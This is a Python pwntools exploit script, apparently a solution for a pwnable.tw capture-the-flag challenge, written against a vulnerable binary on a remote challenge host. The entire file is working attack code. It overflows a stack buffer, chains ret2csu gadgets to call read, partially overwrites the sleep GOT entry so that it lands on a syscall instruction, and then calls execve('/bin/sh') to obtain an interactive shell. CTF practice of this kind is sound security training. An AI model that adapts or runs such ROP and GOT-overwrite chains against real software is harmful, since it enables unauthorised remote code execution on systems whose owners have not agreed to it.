#!/usr/bin/env python3
from pwn import *

p = remote("chall.pwnable.tw", "10403")

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# context.update(binary = elf, log_level = "DEBUG")
# p = elf.process()
# gdb.attach(
#     p,
#     """
# 	b *main+50
#     """,
# )

bss_addr = 0x601028
csu_first_addr = 0x4005E6
#    0x00000000004005e6 <+102>:   mov    rbx,QWORD PTR [rsp+0x8]
#    0x00000000004005eb <+107>:   mov    rbp,QWORD PTR [rsp+0x10]
#    0x00000000004005f0 <+112>:   mov    r12,QWORD PTR [rsp+0x18]
#    0x00000000004005f5 <+117>:   mov    r13,QWORD PTR [rsp+0x20]
#    0x00000000004005fa <+122>:   mov    r14,QWORD PTR [rsp+0x28]
#    0x00000000004005ff <+127>:   mov    r15,QWORD PTR [rsp+0x30]
#    0x0000000000400604 <+132>:   add    rsp,0x38
#    0x0000000000400608 <+136>:   ret
csu_second_addr = 0x4005D0
# 0x00000000004005d0 <+80>:    mov    rdx,r15
# 0x00000000004005d3 <+83>:    mov    rsi,r14
# 0x00000000004005d6 <+86>:    mov    edi,r13d
# 0x00000000004005d9 <+89>:    call   QWORD PTR [r12+rbx*8]


def csu_chain(rbx, rbp, r12, r13, r14, r15):
    chain = b""
    chain += p64(0x0)
    chain += p64(rbx)
    chain += p64(rbp)
    chain += p64(r12)
    chain += p64(r13)
    chain += p64(r14)
    chain += p64(r15)
    chain += p64(csu_second_addr)
    return chain


payload = b""
payload += b"A" * 0x10
payload += b"B" * 0x8  # rbp
payload += p64(csu_first_addr)
payload += csu_chain(
    0x0, 1, elf.got["read"], 0x0, elf.got["sleep"], 1
)  # read(0, 0x601010, 1)
payload += csu_chain(
    0x0, 1, elf.got["read"], 0x0, bss_addr + 0x8, 59
)  # read(0, 0x601030, 59)
payload += csu_chain(
    0x0, 1, elf.got["sleep"], bss_addr + 0x8, 0, 0
)  # execve(0x601030, 0, 0)
sleep(5)

##########
p.sendline(payload)
sleep(0.05)

# x/3i 0x00000000000cb6d8
#    0xcb6d8 <pause+8>:   adc    BYTE PTR [rax+0x22],bh
#    0xcb6de <__pause_nocancel+5>:        syscall
########## overwrite byte low of sleep -> syscall | GOT
p.send(b"\xde")
sleep(0.05)
p.send(b"/bin/sh\x00" + b"A" * 51)

p.interactive()
